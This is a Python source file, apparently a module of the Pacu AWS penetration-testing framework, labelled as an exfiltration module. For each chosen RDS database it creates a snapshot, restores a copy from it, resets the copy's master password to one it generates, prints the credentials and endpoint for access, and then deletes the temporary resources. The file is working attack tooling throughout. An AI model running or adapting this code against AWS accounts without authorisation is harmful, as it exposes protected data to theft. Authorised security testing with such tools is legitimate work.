#!/usr/bin/env python3
import argparse
from pathlib import Path
import json
import random
import string

from botocore.exceptions import ClientError

from pacu.aws import get_boto3_client, get_regions
from pacu.io import print

module_info = {
    'name': 'rds__explore_snapshots',
    'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',
    'category': 'EXFIL',
    'one_liner': 'Creates copies of running RDS databases to access protected information',
    'description': 'Creates a snapshot of all database instances, restores new database instances from those snapshots, and then changes the master password to allow access to the copied database. After the database has been created, the connection information is given. After interactions with the database are complete, the temporary resources are deleted. If there is an unexpected crash during the module\'s execution, the subsequent run of the module will attempt to clean up any leftover temporary resources.',
    'services': ['RDS'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--regions'],
}
parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions in the format us-east-1. Defaults to all session regions.')

TEMP_FILE = Path(__file__).parent / 'temp.json'
WAIT_CONFIG = {'Delay': 10}


def mark_temp(resource):
    if 'DBInstanceArn' in resource:
        key = 'Instances'
        identifier = resource['DBInstanceArn']
    else:
        key = 'Snapshots'
        identifier = resource['DBSnapshotArn']
    data = read_temp()
    data[key][identifier] = resource
    write_temp(data)


def remove_temp(resource):
    if 'DBInstanceArn' in resource:
        key = 'Instances'
        identifier = resource['DBInstanceArn']
    else:
        key = 'Snapshots'
        identifier = resource['DBSnapshotArn']
    data = read_temp()
    del data[key][identifier]
    write_temp(data)


def read_temp():
    with TEMP_FILE.open('r') as infile:
        data = json.load(infile)
    return data


def write_temp(data):
    with TEMP_FILE.open('w') as outfile:
        json.dump(data, outfile, default=str)


def cleanup(pacu):
    data = read_temp()
    success = True
    for instance in data['Instances']:
        client = get_boto3_client('rds', data['Instances'][instance]['AvailabilityZone'][:-1])
        if not delete_instance(client, instance, print):
            success = False
    for snapshot in data['Snapshots']:
        client = get_boto3_client('rds', data['Snapshots'][snapshot]['AvailabilityZone'][:-1])
        if not delete_snapshot(client, snapshot, print):
            success = False
    return success


def main(args, pacu):
    """Main module function, called from Pacu"""
    args = parser.parse_args(args)
    if args.regions:
        regions = args.regions.split(',')
    else:
        regions = get_regions(pacu.session, 'rds')
    if not cleanup(pacu):
        if pacu.input('  Cleanup Failed. Continue? (y/n) ') != 'y':
            return {'fail': 'Failed to delete temporary data.'}
    summary_data = {'instances': 0}
    for region in regions:
        print('Region: {}'.format(region))
        client = get_boto3_client('rds', region)
        print('  Getting RDS instances...')
        active_instances = get_all_region_instances(client, print)
        print('  Found {} RDS instance(s)'.format(len(active_instances)))
        for instance in active_instances:
            prompt = '    Target: {} (y/n)? '.format(instance['DBInstanceIdentifier'])
            if pacu.input(prompt).lower() != 'y':
                continue
            print('    Creating temporary snapshot...')
            temp_snapshot = create_snapshot_from_instance(client, instance, print)
            if not temp_snapshot:
                print('    Failed to create temporary snapshot')
                continue

            print('    Restoring temporary instance from snapshot...')
            temp_instance = restore_instance_from_snapshot(client, temp_snapshot, print)
            if not temp_instance:
                print('    Failed to create temporary instance')
                delete_snapshot(client, temp_snapshot, print)
                continue

            process_instance(pacu, client, temp_instance)

            print('    Deleting temporary resources...')
            delete_instance(client, temp_instance, print)
            delete_snapshot(client, temp_snapshot, print)
            summary_data['instances'] += 1
    if not cleanup(pacu):
        summary_data['fail'] = 'Failed to delete temporary data.'
    return summary_data


def process_instance(pacu, client, instance):
    waiter = client.get_waiter('db_instance_available')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))
    print('    Master Password for current instance: {}'.format(password))
    if modify_master_password(client, instance, password, print):
        print('      Password Change Successful')
    else:
        print('      Password Change Failed')

    response = client.describe_db_instances(
        DBInstanceIdentifier=instance['DBInstanceIdentifier']
    )
    endpoint = response['DBInstances'][0]['Endpoint']
    print('    Connection Information:')
    print('      Address: {}'.format(endpoint['Address']))
    print('      Port: {}'.format(endpoint['Port']))

    pacu.input('    Press enter to process next instance...')


def modify_master_password(client, instance, password, print):
    try:
        client.modify_db_instance(
            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
            MasterUserPassword=password,
        )
        return True
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return False


def restore_instance_from_snapshot(client, snapshot, print):
    waiter = client.get_waiter('db_snapshot_available')
    waiter.wait(
        DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.restore_db_instance_from_db_snapshot(
            DBInstanceIdentifier=snapshot['DBSnapshotIdentifier'],
            DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
        )
        mark_temp(response['DBInstance'])
        return response['DBInstance']
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return {}


def delete_snapshot(client, snapshot, print):
    waiter = client.get_waiter('db_snapshot_available')
    waiter.wait(
        DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.delete_db_snapshot(
            DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier']
        )
        remove_temp(response['DBSnapshot'])
        return True
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return False


def delete_instance(client, instance, print):
    waiter = client.get_waiter('db_instance_available')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.delete_db_instance(
            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
            SkipFinalSnapshot=True,
        )
        remove_temp(response['DBInstance'])
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
        return False
    waiter = client.get_waiter('db_instance_deleted')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    return True


def create_snapshot_from_instance(client, instance, print):
    waiter = client.get_waiter('db_instance_available')
    waiter.wait(
        DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        WaiterConfig=WAIT_CONFIG,
    )
    try:
        response = client.create_db_snapshot(
            DBSnapshotIdentifier=instance['DBInstanceIdentifier'] + '-copy',
            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
        )
        mark_temp(response['DBSnapshot'])
        return response['DBSnapshot']
    except ClientError as error:
        print('      ' + error.response['Error']['Code'])
    return {}


def get_all_region_instances(client, print):
    out = []
    paginator = client.get_paginator('describe_db_instances')
    pages = paginator.paginate()
    try:
        for page in pages:
            out.extend(page['DBInstances'])
        return out
    except ClientError as error:
        print('    ' + error.response['Error']['Code'])
        return []


def summary(data, pacu_main):
    if 'fail' in data:
        out = data['fail'] + '\n'
    else:
        out = '  No issues cleaning up temporary data\n'
    out += '  {} Copy Instance(s) Launched'.format(data['instances'])
    return out
